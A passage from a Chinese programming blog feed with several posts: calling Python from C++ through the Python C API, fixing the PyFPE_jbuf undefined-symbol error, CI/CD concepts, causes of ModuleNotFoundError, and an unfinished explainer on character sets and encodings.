  这些api主要是导入python模块，类似关键字import，同时返回模块的属性dict。这些属性包含当前命名空间下的：全局变量，全局函数，类等等。


python callable object , python class object, python object function
/*
Return value: New reference.
Call a callable Python object callable, with arguments given by the tuple args. If no arguments are needed, then args can be NULL.

Return the result of the call on success, or raise an exception and return NULL on failure.

This is the equivalent of the Python expression: callable(*args).
*/
PyObject* PyObject_CallObject(PyObject *callable, PyObject *args)


/*
Return value: New reference.
Return a new instance method object, with func being any callable object func is the function that will be called when the instance method is called.
*/
PyObject* PyInstanceMethod_New(PyObject *func)

//call obj.func
PyObject* PyObject_CallMethod(PyObject *obj, const char *name, const char *format, ...)
PyObject* PyObject_CallMethodObjArgs(PyObject *obj, PyObject *name, ..., NULL)




PyObject 对象

  这个对象是pythonc c api 所有对象的wrapper，有许许多多需要注意的事项，其中最重要的就是其内存管理问题。详细细节参考官方doc，这里给出最重要的几条我遇到的结论：


pyobject 是依靠引用计数来管理对象的。


pyobject 的创建者需要对这个obj负责，创建者可以传递，存储，和调用 Py_DECREF()


python c api 都有关于pyobject的处理说明，比如：借用，新建。如下图。



    
        
    
   

    
        
    
   
本章特别重要，有兴趣的去看官方文档。当你乱用Py_INCREF和Py_DECREF时，你写的程序会在调用Py_Finalize时崩溃，这个时候，你需要看下文，去看看你哪个地方用错了。（https://docs.python.org/3.8/extending/extending.html#ownership-rules）




实例

  上一个实例来展示本文所有内容。
  这是我要调用的python module
'''
'''
@Description: 
@Author: Sky
@Date: 2019-12-05 16:23:29
@LastEditors  : Sky
@LastEditTime : 2020-01-09 18:04:41
@FilePath: \Test_C_Call_Python\py_modules\py_normal_test.py
'''
import sys

class TestPythonNormal:
    cls_attr = 'I am cls attr'
    # def __new__(class_ins):
    #     print('call TestPythonNormal.__new__')
    #     return class_ins
    def __init__(self):
        print('call TestPythonNormal.__init__')
        self.obj_attr = 'I am obj attr'

    def test_add(self, a = 0 , b = 0):
        print("a = ", a)
        print("b = ",  b)
        print("a + b = ", (a + b))
        return (a + b)


g_num = 22222
g_str = 'hello f***'

def g_func(a):
    print("g_func arg = ", a - 1)

if __name__ == '__main__':
    test = TestPythonNormal()
    test.test_add(2, 3)
    print(TestPythonNormal.__dict__)
    # print(TestPythonNormal.__dir__(test))



/*
 * @Description: 
 * @Author: Sky
 * @Date: 2020-01-09 11:26:28
 * @LastEditors  : Sky
 * @LastEditTime : 2020-01-09 18:21:53
 * @FilePath: \Test_C_Call_Python\test_tmp.cpp
 * @Github: 
 */
#ifdef __cplusplus
extern "C"&#123;
#endif //

#define PY_SSIZE_T_CLEAN
#include &lt;Python.h>

#ifdef __cplusplus
&#125;
#endif //

#include &lt;iostream>

int main(int argc, char * argv[])&#123;

    //This function works like Py_Initialize() if initsigs is 1. 
    //If initsigs is 0, it skips initialization registration of signal handlers, which might be useful when Python is embedded.
    Py_InitializeEx(1);
    PyRun_SimpleString("print('hello world.')");

    //add path of module-py_normal_test to sys.path
    PyRun_SimpleString("import sys");
    PyRun_SimpleString("import numpy as np");
    PyRun_SimpleString("sys.path.append('E://TestDir//Test_C_Call_Python//py_modules')");
    PyRun_SimpleString("print(sys.path)");

    //import 
    //Return value: New reference.
    PyObject * p_module = PyImport_ImportModuleEx("py_normal_test", NULL, NULL, NULL);//import module

    //get module attr, they are g_var, g_func, class and so on.
    //Return value: Borrowed reference.
    PyObject * p_dict_mo = PyModule_GetDict(p_module);//get module's all attr
    //Return value: Borrowed reference.
    PyObject * p_module_g_num = PyDict_GetItemString(p_dict_mo, "g_num");// global var

    PyObject * p_module_cls = PyDict_GetItemString(p_dict_mo, "TestPythonNormal");//class

    PyObject * p_module_g_func = PyDict_GetItemString(p_dict_mo, "g_func");// global function

    //print g_var
    std::cout&lt;&lt;"g_num is "&lt;&lt;PyLong_AsLong(p_module_g_num)&lt;&lt;std::endl;

    //call g_func
    //Return value: New reference.
    PyObject * arg_tuple = PyTuple_New(1);
    PyTuple_SetItem(arg_tuple, 0, p_module_g_num);//prepare arg
    PyObject_CallObject(p_module_g_func, arg_tuple);//call g_func
    

    //instance a class
    //Return value: New reference.
    PyObject * p_cls_instance = PyInstanceMethod_New(p_module_cls);//call builtin.__new__, new a instance
    //Return value: New reference.
    p_cls_instance = PyObject_CallObject(p_cls_instance, NULL);//call __init__,construct function,return None
    // Py_XDECREF(p_none);

    //print class-var
    //Return value: New reference.
    //PyObject* PyObject_GetAttrString(PyObject *o, const char *attr_name)
    PyObject * cls_attr = PyObject_GetAttrString(p_module_cls, "cls_attr");
    std::cout&lt;&lt;"cls_attr is "&lt;&lt;PyUnicode_AsUTF8(cls_attr)&lt;&lt;std::endl;
    
    //print obj.var
    PyObject * obj_attr = PyObject_GetAttrString(p_cls_instance, "obj_attr");
    std::cout&lt;&lt;"obj_attr is "&lt;&lt;PyUnicode_AsUTF8(obj_attr)&lt;&lt;std::endl;

    //call obj.func
    //Way0: This is the equivalent of the Python expression: obj.name(arg1, arg2, ...).
    //Return value: New reference.Return value: New reference.
    PyObject * ret0 = PyObject_CallMethod(p_cls_instance, "test_add", "ii", 10, 10);//test_add(self, 10, 10)
    std::cout&lt;&lt;"call obj.func, Way0 ret =  "&lt;&lt;PyLong_AsLong(ret0)&lt;&lt;std::endl;

    
    //Return value: New reference.
    PyObject * func_name = Py_BuildValue("s","test_add");//
    PyObject * arg1 = Py_BuildValue("l",3);
    PyObject * arg2 = Py_BuildValue("l",3);
    //Return value: New reference.
    PyObject * ret1 = PyObject_CallMethodObjArgs(p_cls_instance, func_name, arg1, arg2,  NULL);//test_add(self, 3, 3)
    PyErr_PrintEx(1);
    std::cout&lt;&lt;"call obj.func, Way1 ret =  "&lt;&lt;PyLong_AsLong(ret1)&lt;&lt;std::endl;
        
    



    Py_XDECREF(ret1);
    Py_XDECREF(arg2);
    Py_XDECREF(arg1);
    Py_XDECREF(func_name);
    Py_XDECREF(ret0);
    Py_XDECREF(obj_attr);
    Py_XDECREF(cls_attr);
    Py_XDECREF(p_cls_instance);
    Py_XDECREF(p_module);
    //Py_XDECREF(ret0);

    Py_Finalize();
#ifdef _WIN32 || _WIN64

    system("pause");

#elif __linux__ || __linux


#endif //    
	return 0;
&#125;

  效果：

    
        
    
   
  以下的内容希望重点关注：



其实这个看起来是很简单的，如果有一定的c++基础，整个流程就是导入模块，获取模块中的属性，这些属性包括函数，全局变量，类等等。


操作全局的函数和变量


这里最难的还是对于python class 的操作，第1点中获取的类属性是一个callable object，这个时候需要实例化class(这里调用了builtin的__new__，而不是class中重载的__new__)，然后需要手动调用__init__方法。到此，class的实例化完成


通过api获取class的属性，就是class的变量


通过api调用object method，传入obj和函数名，包括参数，直接调用即可，主要某些api要关注self这个参数。







调试常用手段



如果Py_Finalize()调用时，崩溃了，请检查自己的Py_INCREF和Py_DECREF各个引用增减是否正确。


如果某些python c api调用失败了，可以尝试使用 PyErr_PrintEx(1);






后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>CPP</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>undefined symbol: PyFPE_jbuf 问题分析并处理</title>
    <url>/2020/03/12/blog_idx_092/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前景提要

  最近在某平台撸（学习）npu一个解决方案，既然要学习，就重头开始呗。首先我们就刷板子，没啥毛病，刷机正常。然后就开始配置环境，配置环境虽然有点小打小闹的问题，后面可能会记录过程吧，还是成功躺过，然后我就
  运行其自带的例子。然后得到以下毛病：

    
        
    
    




探索

  因为我写过c/c++调用python的程序，所以我看到这个未定义的符号命名规则，我就知道，肯定是我TNND在编译python3.5的时候，少了点什么东西。下面查看系统python3的符号和我自己编译的python3的符号就证明了我的猜测：

    
        
    
    

    
        
    
    
  既然这样我就去看看Python3.5的源码，还是发现了这个符号的踪迹：

    
        
    
    
  哟西，直接排除fpectlmodule.c文件的，因为其是一个static，未export的变量。看看pyfpe.h呢？

    
        
    
    
  soga，那么几乎可以确定是这个WANT_SIGFPE_HANDLER没有启用。既然这个宏未启用那么一定有一个开关可以打开？
  我们先来看看这个头文件的说明，可以得到的是这个模块是用来处理linux上的SIGFPE信号的。

    
        
    
    
  简单说明：SIGFPE信号就是floating-point exception（浮点异常），比如除0试试，好玩！
  我们继续看看帮助文档呢？
  ./configure --help看看呢？

    
        
    
    
  找到了，发现了这个。应该是要添加这个选项，虽然我不知道为啥py要把这个选项独立出来。




解决方案

  我看了网上的大部分方案都是说python版本过多的问题导致的。怎么说呢？原因确实可以这样说版本错误，因为你自己编译的版本和系统直接安装的版本编译参数是不一样的，所以有这个错。
#重新编译python即可
./configure --prefix=/usr/local/python3 --enable-shared --with-fpectl   
make -j16
sudo make install

    
        
    
    
  出来啦，然后解决问题，完结散花。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>python</category>
        <category>嵌入式</category>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>软件开发、持续集成（CI）、持续交付(CD)、持续部署（CD） 和 版本管理(Version Control) 的理解和思考</title>
    <url>/2019/12/20/blog_idx_090/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  软件开发，水很深。
  做了两年有余的攻城狮，做了代码开发，技术框架搭建，环境搭建，项目管理，用户沟通等工作，我从代码开发者的角度来看，我们的写的内容到用户实际使用往往中间有许多的内容的，作为开发者，千万别人为自己写的代码就是整个项目周期的全部，其实code部分只占很少的时间，从code后到交付给用户使用的中间部分才是非常大的一个时间占比。




软件开发思考

  在学校里面，当我们学习软件工程这门课时，教授的内容是比较传统的软件开发流程，它们大概是如下的流程：


获取到大致项目需求


需求评估


需求文档整理


概要设计（技术框架设计）


编码


测试


交付


  当交付给用户后，实际情况是不可能一次性交付成功的，都会涉及到相关的需求细化和变更，于是又要重复5-7的步骤。
  到了实际工作中后，会出现一种现象，项目交付的时间尽可能短，项目需求变更和交付时间也需要尽可能的短，于是就出现了传统按部就班的开发模式不能够完成相关的项目，于是出现了一些快速开发的方法，如敏捷开发。
  在实际过程中，敏捷开发只是加速开发迭代部分，如果没有控制好，就会出现开发速度加快了，但是测试，交付会出现问题，为啥会出现呢？其实很简单，就是都是独立串行的，这会导致从整体看，项目开发时间拖长。
  为了解决类似的问题，又提出了类似Devops的说法，就是大家都坐一起，相互依赖的做事，因为都是站在整体考虑的，所以可以对整个流程（开发、测试、交付）的情况进行协调，效率会比较好。
  为了把上述的问题处理好，我们必须要引入一些工具（VCS,CI,CD,CD）来帮助我们做事，否则是处理不好的这些事的，就会出现：要不效率低，能完成。要不效率高，就是容易出错。




版本管理系统（Version Control System）

  版本管理系统，这个不用介绍了，大家平常工作中都会用，常用的有svn和git，如果没有接触过，有兴趣的可以多去网上找找资料学习学习，它们可以提供代码管理、溯源等功能。
  版本管理系统除了本身的属性外，它自身带的一些特性可以用来做一些其他的事情，比如它的push事件可以用来触发一些其他的工作。




持续集成（Continuous Integration）

  持续集成其实对于开发者来说，是很简单的一件事情。就相当于你code完，然后手动编译，测试这样的一个流程。平常比如你用vs写了一个程序，然后你右键编译，然后f5运行测试，最后到相应的目录去打包发布程序。这种方式在软件规模比较小的时候，完全可以采用，流程可控的，当软件规模过大，而且需要持续维护修改时，这种方式会让人炸裂的。
  所以持续集成简单的归纳为通过一些工具来自动化编译，单元测试，并生成相关的报告。至于什么时候自动开始编译，这里就是上文说的VCS的相关事件来触发就行。




持续交付（Continuous Delivery）

  持续交付其实由相关QA质量保证团队来手动或者自动的方式，检测刚刚持续集成的程序版本，在模拟生产环境下，是否能够正常工作。
  这里强调的还是内部测试，只是相关测试更贴近于实际生产环境。注意这里没有部署到生产环境。对于很多公司来说，其实QA软件部门是等于没有的。




持续部署（Continuous Deployment）

  持续部署就是通过一些工具，自动化的把经过单元测试，QA测试后，打包，自动化部署到生产环境这么一个过程。




关于ci，cd，cd，vcs的说明

  其实就以上而言，你可以直接认为就是，使用工具，自动化从vcs拉取代码，自动化编译测试程序，（半）自动化QA保证，自动化部署程序到生产环境这么一个过程。这里借助了很多自动化工具，大大节约了程序多次迭代的时间。所以对于软件开发来说，哪怕是敏捷开发，devops等模式都可以很好的建立起来。
  但是不是说以上的就是最好的呢？因为在软件第一次发布的时候，如果借用以上的自动化流程，需要一个人或者团队来建立这个自动化逻辑，这是比较烦的一件事情，所以如果软件迭代次数少，规模不大，不要硬搬硬套上述整个流程，实在是不合适。但是里面的vcs，我还是希望每个项目都能够用起来，真的很不错。




Jenkins ， Travis  ，Github Action 等ci，cd工具说明

  这些工具是我用过的，世界上还有许多这样的工具，看个人喜好了。这里要对这些工具分一个类，按照他们的部署位置分一下，一种是需要自己搭建相关服务的，并完成cicd的事情，一种是自己提供相关配置文件（yml），由云端给你解析这个配置文件并完成相关功能。
  这里Jenkins是属于需要自己搭建服务的，需要自己定义相关的流程并完成cicd的事情。
  Travis，GitHub Action这种是输入云端的功能，基本上算是属于SaaS，你只需要提供遵循相关语法的配置文件，它们就会自动完成你定义的流程。




后记

  总结
  合适的事情，选择合适的工具。不是所有的情况都能够把上面的整套给怼到团队中去，但是整个软件开发的流程和内容还是值得我们大家思考和借鉴的。
  比如我们的团队就引入了git和jenkins就够了，能够做简单的版本管理和基本的软件集成测试。其他的手动介入性价比比较好。
  比如我自己封装的一些开源小功能，我引入git，travis， github action就已经足够了。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
      </categories>
      <tags>
        <tag>CI</tag>
        <tag>CD</tag>
      </tags>
  </entry>
  <entry>
    <title>ModuleNotFoundError: No module named xxx 的原因和解决办法（附带新大陆）</title>
    <url>/2020/06/16/blog_idx_094/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




ModuleNotFoundError: No module named ‘xxx’ 分析

  这个问题只要是用过python的人，一般或多或少都会遇到过这个问题，这个问题其实很明确，就是你import的module找不到。
  关于为啥找不到的原因，倒是有很多花里胡哨原因。




Python module的搜索路径

  python的module搜索路径，其实是编译python的时候就有相关的默认配置的。例如：

python -m sysconfig


    
        
    
 
  这里面就包含了相应的搜索路径。但是我们执行如下命令看真实的搜索路径，就会发现一些奇怪的东西。

python3 -c “import sys;print(sys.path)”


    
        
    
 
  其实这里可以看出多了一些不常见的搜索目录，其实出了我们常见的site-packages外，python还有其他builtin 和一些独立的自带的模块。site-packages在约定中，是用来存放第三方库的，也就是你pip install安装的module.
  这里有个重要的目录是/usr/lib/python3.6/lib-dynload/，里面的so是python 自带模块的底层实现，比如ctype 对应的实现是 _ctype.

    
        
    
 
  上面sys.path包含的路径，就是python import 模块时的全部搜索路径了。当然，还包含一个当前路径，也就是你执行python命令的路径，也会被默认搜索。
  此外，通过环境变量PYTHONPATH也可以向sys.path添加值。
  正常情况下，我们就可以通过在这些目录里面放置我们的模块，然后在python里面import即可。




ModuleNotFoundError: No module named ‘xxx’ 可能原因和解决方案



s1
   原因：sys.path 所包含的所有目录中，确实无对应的xxx模块。
   解决方法：这个时候，通过pip install安装即可解决。


s2
  原因：sys.path 所包含的所有目录中，有对应的xxx模块，但是有多个地方都存在（可能是同样的版本，可能是不一样的版本）。
  解决方法：所有的目录中，只保留一个xxx模块即可，其他的都uninstall了。（小提示：这里推荐使用虚拟环境，这样就很少出现这种情况，出现这种情况的本质原因还是一个系统配置了太多的python版本）


s3 （新大陆）
  这种情况也是我最近遇到的新坑。具体表现是sys.path目录中有xxx模块，而且还有且只有一个。根据我们上文的s1，s2情况来看，这就应该解决的问题了呀，可是并没有。这就让我很懵逼。
  情况复现：我手动编译了一个python3，需要使用python c interface功能。我同时生成了debug和release的python3的库。在我尝试import numpy的时候，release的库一直ok，但是debug的python库一直报找不到numpy的库。（我确定numpy在sys.path中，而且只有一个）
  经过我大量的寻找，在如下的一个链接（https://bugs.python.org/issue36716） 里面，找到了答案。

    
        
    
 
  原来python 的debug和release版本，import 的时候，一些库的命名上面是有区别的。
  我们分别在linux和win下执行如下：
import importlib.machinery
print(importlib.machinery.all_suffixes())
  linux:

    
        
    
 
  windows:
  release：

    
        
    
 
  debug:

    
        
    
 
  可以看到，这里的.pyd（类似windows dll）和.so（类似linux so）分别是不通平台下，python import 需要的库的后缀。
  同时我们也可以看到，同一平台下，release 和 debug版本的python import的时候，需要的module名字可能有些诧异，最直白的就是多了_d。
  注意：windows-debug图中画红框部分，是由于我改了python的源码，它才会认识不带_d的module。哪怕这个module命名不带_d，但是它必须是debug版本的module才行，换句话说，仅仅是命名上的区别。如果你弄一个release的库，我这个python的debug版本依然不会import成功。改原因的原因也很苦逼，就是通过编译生成的debug module，它不会自动的给你加上_d，坑爹，如果这种模块多，需要你自己重命名的module太多了，于是，直接该源码才是很爽的方法。
  解决方法也很简单的：直接编译一个debug版本的xxx模块即可。同时修改生成的module库，加上_d即可解决。
  原因也很简单就是库的名字没有对上，导致找不到。
  一般来说，s3这种情况大家都不会碰见的，除非和我一样，用python c interface的时候，在debug模式下使用，就可能会出现这种情况。找起答案来，也比较麻烦。
未完待续（以后遇到新的再补充）




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>python</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>字符集、字符编码、国际化、本地化简要总结(UNICODE/UTF/ASCII/GB2312/GBK/GB18030)</title>
    <url>/2020/10/20/blog_idx_101/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  普通的linux 和 普通的windows。
  VS2015 和 GCC 7.0
前言

  曾记得，我在(https://blog.csdn.net/u011728480/article/details/100277582  《数与计算机 （编码、原码、反码、补码、移码、IEEE 754、定点数、浮点数）》)里面说过，计算机里面存储了数值和符号。数值包含定点数和浮点数。符号包含文字及其他符号。
  那符号在计算机中是怎么表示的呢？这里首先就要引出一个概念叫做字符集，就是“人为”记录归纳的某种文字或者符号在这个集合中的索引(例如：Ascii 中的’a’ 的索引为97)。有了这个字符集合后，我们怎么在计算机中表示这个字符集合呢？毕竟我们设计这个字符集合就是为了在计算机里面显示相关的符号的。这里我们就要引出一个字符编码的概念，就是在计算机中怎么表示相关的符号（例如：Ascii 我们发现基本的字符集只规定了128个。于是我们用一个字节来标识这个字符集中的字符即可。）。注意这里提到的Ascii即可指字符编码也可指字符集，至少我是这样理解的。
  一直以来，我反正只是大概模糊的记得，ascii 代表字母及其他基本字符。 gb2312/gbk/gb18030/big5 … 代表的就是多字节的中文及其他字符。unicode 和 utf-8 可以代表世界上大部分国家及地区的字符符号，同时unicode是两字节的，utf-8是多字节的(注意，关于unicode的说法其实有点小毛病，详见下文)。我早就想详细的了解和记录一下这些说法的含义，但是一直没有一个较好的机会。
  最近做的一个项目里面，要在内存里面查找和对比中文（c++ 里面存的中文，lua要去找和对比），这NM可把我苦惨了，于是我一狠心，就要把这个问题搞明白，不求全部搞清楚，但求我能够怎么解决这个问题，以及以后遇到这些问题怎么处理。
  下面是一些常见及不常见短语说明：


UNICODE（The Unicode Consortium（统一码联盟，是大公司组合的联盟），一种字符集）


UCS（Universal Multiple Octet Coded Character Set（通用多字符编码集，是ISO标准委员会提出的），一种字符集）


UTF/UTF-8/UTF-16（一种基于UNICODE的字符编码格式，UTF是UCS Transfer Format的简写）


GB2312/GBK/GB18030（全国信息技术标准化技术委员会出版的3个版本的字符集及字符编码格式）


ASCII(American Standard Code for Information Interchange，常见的基本英文编码)


DBCS(Double-byte character set)


ANSI(不知道是什么的简写，但是只会出现在windows平台)


本地化/国际化(本地化和国际化是一个比较坑的概念，本地化可以简单理解为把文字和符号显示给对应区域的人。 国际化就是把文字和符号显示给尽量多的人。我也不知道这样翻译对不对QAQ)






常见的字符集及对应的字符编码规则说明

  字符集是存放的人为定义的一个字符索引集合。 字符编码是考虑怎么把这个字符集合在计算机中表示出来。


常见中文字符集及字符编码(GB2312/GBK/GB18030)
  关于GB2312/GBK/GB18030的详细说明大家可以去网上找找资料详细了解，他们有许多的历史因素在里面。我这里就只做简单的说明。
  首先GB2312/GBK/GB18030是三个国标的简称。是全国信息技术标准化技术委员会参考或者说是对接ISO提出的字符集/字符编码方法，然后出版的适合中国特色的字符集/字符编码标准。注意这里的GB2312/GBK/GB18030既可以称作字符集也可以称作字符编码，我们好像常用是把这个三个当做字符编码，但是没有强调字符集是什么，所以我觉得这个是三个即是字符集又是字符编码。下面对这三个字符编码规则进行简单的说明，这些规则里面可能有些历史原因小故事在里面，感兴趣的人去网上找找看，我这里不做无用功了。
  GB2312是我国第一个字符集/字符编码。其使用2个字节代表一个汉字，而且为了兼容Ascii，约定两个编码字符都必须大于0xA0（每个字节都大于127，可以区分出Ascii与GB2312）。也就是说，GB2312的编码范围为：0xA1A1~0xF7FE。而且由于标注出版的比较早，里面只包含了常见的汉字和非汉字内容。
  GBK是对GB2312的扩展。同样也是使用2个字节代表一个汉字。首先GBK原封不动的继承了GB2312的编码，同时编码范围由0xA1A1~0xF7FE 扩展到0x8140~0xFEFE。多余GB2312的这些编码，又添加了一些cjk的汉字和符号，同时也提供了自定义文字区域编码的。
  GB18030是2005年出的最新的中文字符集/中文字符编码。它是变长字节编码方式，和utf系列很像。下面进行简略的说明：


1字节，0x00~0x7F  兼容Ascii


2字节，0x8140~0xFEFE  兼容GBK


4字节，0x81308130~0xFE39FE39 存放其他文字和符号，例如我国的少数民族的文字、繁体汉字、日韩汉字等等。


  这里多说一句，采用变长编码的原因是节约字符存储空间或者说是为了节约网络传输带宽。


常见的Unicode字符集与UTF系列编码
  上面我们介绍了中文的字符集及字符编码，可以想象的是，非中文，非英文地区的人，也会做和我们同样的事情，他们会定义适合他们自己的字符集，并定义适合他们自己的字符编码。那就直接炸裂了，因为每个地区都有自己的字符集和字符编码，非常不适合各个地方的人们文字交流。与此同时，网络使得各个地方的人们交流更加的频繁，于是有些人就不爽了，想定义一个字符集来包含全世界的所有字符，这样人们交流的时候就不需要对字符进行专门的转码。
  于是国际标准委员会和一个叫做统一码联盟的组织分别起草了一个字符集，分别是UCS 和 UNICODE。后面考虑到大家都是做的同样的事情，于是两个字符集合并了，叫做UCS/UNICODE。我们常见的是UCS-2/UNICODE。这个字符集里面包含了全世界大部分的文字和符号。其表示范围大概是0x000000 到 0x10FFFF。 UNICODE 字符索引一般表示为U+0x00AAAA
  在定义UCS/UNICODE这个超大字符集后，肯定想定义一个字符编码才符合这些组织的身份。于是产生了UTF字符编码系列的格式。我们常见的就是UTF-8/UTF-16 BE/UTF-16 LE/UTF-32 BE/UTF-32 LE格式。
  UTF-32简要说明：直接用4个字节表示UNICODE字符串， 例如索引U+0xABCDEFAA  就表示为0xABCDEFAA(BE 大端)  或者 0xAAEFCDAB(LE 小端)。
  UTF-16简要说明（windows常用编码，与UTF-32一样有类似的字节序存在）：


U+0x0000 到 U+0xFFFF 用2个字节表示。


U+0x1 0000 到 U+0x10 FFFF 用4个字节表示。


  下面对UTF-8进行简要的说明：


1字节，0000/0000-0000/007F(hex), 二进制填充方式：0xxx xxxx(binary)


2字节，0000/0080-0000/07FF(hex), 二进制填充方式：110x xxxx/10xx xxxx(binary)


3字节，0000/0800-0000/7FFF(hex), 二进制填充方式：1110 xxxx/10xx xxxx/10xx xxxx(binary)


4字节，0001/0000-0010/FFFF(hex), 二进制填充方式：1111 0xxx/10xx xxxx/10xx xxxx/10xx xxxx(binary)


  对应的编码范围是:


0~127


128~2047


2048~65535


65536以上


  UTF-8的实现方式就是查出字符索引：U+0xABCD(U+43981) ,可以看到落在的编码范围是3字节范围，也就是2048~65535。于是我们看到的二进制还有16个位置，恰好，我们的编码的二进制也是16个。从左到右依次放入对应位置的x即可。0xABCD二进制为：1010 1011 1100 1101, 对应的UTF-8编码为: 1110 (1010)/10(10) (1111)/10(00) (1101)




本地化和国际化

  上面我们介绍了两个系列的字符集和对应常用的字符编码。GBXXX系列是CJK区域的多字节编码，UNICDOE/UTF系列是全球大多数通用字符集及编码。那么为了我们发布的计算机文件能够在全世界方便的使用，我们有两种方案：


使用区域性多字节编码，例如我们发布的文件，携带多种区域性字符编码文件(GBXXX/阿拉伯的编码等等)，在不同地区的电脑上，根据系统的地区（win和linux都有，很重要，设置区域），使用不同的区域字符编码文件进行显示。


直接使用UNICDOE/UTF系列，全球通用。


  看起来，直接使用UNICDOE/UTF系列就完事儿了，花里胡哨，弄那么多。其实不然，你看了UTF-8，对我们中文区来说不公平，因为大部分都是3字节，而对于Ascii区域来说，他们的UTF-8，大部分都是1字节。这NM就坑了撒，难道我大中华的硬盘或者带宽就无限了？其次，可能有些我们可以在GB系列里面定义的偏门字符内容，可能UNICODE里面没有，对于一个足够大的市场来说，如果连他们的文字符号都表示不完，那还玩个D。于是也需要有GB系列这种区域性的来补充，换句话说，就是看实际应用。这就是软件本地化和国际化的意义，里面最要命的就是字符问题。
生活中常见的几个有趣小实验(猜到就让你嘿嘿嘿)

  下面我们做一些比较有趣，而且常见的小实验。


VS的Unicode字符集 和 多字符集选项(cl.exe)
  在我们编程的时候，特别是要涉及中文编程的时候，很多时候需要和这个选项打交道，也就是如图。那么这两个选项有啥区别呢？请听我慢慢道来。

    
        
    
    
  这个选项的主要作用是用来帮助 cl.exe 确认启用什么样的Api，也就是我们常说的W结尾的还是A结尾的Api。下面我们用下面的小程序来实验一波。
#include &lt;cstdio&gt;
#include &lt;windows.h&gt;
int main(int argc, char * argv[]) &#123;

	const char *_str &#x3D; &quot;卧槽&quot;;
	printf(&quot;_str&#39;s mem &#x3D; %x %x %x %x\n&quot;, 0xFF &amp; _str[0], 0xFF &amp; _str[1], 0xFF &amp; _str[2], 0xFF &amp; _str[3]);
	const wchar_t *_str_1 &#x3D; L&quot;卧槽&quot;;
	printf(&quot;_str&#39;s mem &#x3D; %x %x\n&quot;, 0xFFFF &amp; _str_1[0], 0xFFFF &amp; _str_1[1]);
	
	&#x2F;&#x2F;MessageBoxW(NULL, L&quot;卧槽&quot;, L&quot;U&quot;, MB_OK);
	&#x2F;&#x2F;MessageBoxA(NULL, &quot;卧槽&quot;, &quot;M&quot;, MB_OK);

	system(&quot;pause&quot;);
	return 0;
&#125;
  运行以上代码我们可以得到下图的内容。

    
        
    
    
  然后我们根据以上的内容，通过二进制编辑器，构造了两个txt文件。然后通过vs code 不同解码下打开。才能够得到正确文字内容。

    
        
    
    

    
        
    
   

    
        
    
   
  下面我们来解释Window Api中 A系列和W系列的区别。 例如在MessageBoxW(NULL, L&quot;卧槽&quot;, L&quot;U&quot;, MB_OK)和 MessageBoxA(NULL, “卧槽”, “M”, MB_OK)中，我们传入的参数一个是char *的，一个是wchar_t *,通过我们打印，可以发现对应的内存数据是完全不一样的，也就是说对应的文字编码是完全不同的。A系列对应的GB18030编码（多字节，区域编码，不同地区，可能就不是gb系列的编码了），W系列对应的UTF-16 BE编码（UNICODE）。那么，它们代表啥意思呢？
  如果我们用A系列的Api，那么就是用的多字节编码，也就是对应的本地区域编码，在我们这个CJK区域，能够正常显示文字，但是如果不在我们CJK区域的话，极有可能就出现乱码。也就是说，通过A系列弄出来的程序，很有可能就只能够在我们CJK区域使用，其他区域可能需要用源代码，在其他对应区域的VS编译一下，才能够正常使用程序。
  如果我们用W系列的Api，那么用的就是UTF-16 BE编码，由于UNICODE是针对全球大多数语言来做的一个字符集，那么意味着，我们这个程序只需要编译一次，把二进制分发到全世界大多数区域也能够正常使用的。
GCC的-finput-charset/-fexec-charset=gbk选项
  首先GCC的默认把源文件用UTF-8解码，如果遇到不支持的字符，需要使用-finput-charset来帮助才行。然后，我们分别带和不带-fexec-charset=gbk编译如下程序，并运行。
#include &lt;cstdio&gt;

int main(int argc, char * argv[]) &#123;

	const char *_str &#x3D; &quot;卧槽&quot;;
	printf(&quot;_str&#39;s mem &#x3D; %x %x %x %x %x %x\n&quot;, 0xFF &amp; _str[0], 0xFF &amp; _str[1], 0xFF &amp; _str[2], 0xFF &amp; _str[3], 0xFF &amp; _str[4], 0xFF &amp; _str[5]);
	const wchar_t *_str_1 &#x3D; L&quot;卧槽&quot;;
	printf(&quot;_str&#39;s mem &#x3D; %x %x\n&quot;, 0xFFFF &amp; _str_1[0], 0xFFFF &amp; _str_1[1]);
	return 0;
&#125;
  得到如图的结果。

    
        
    
   
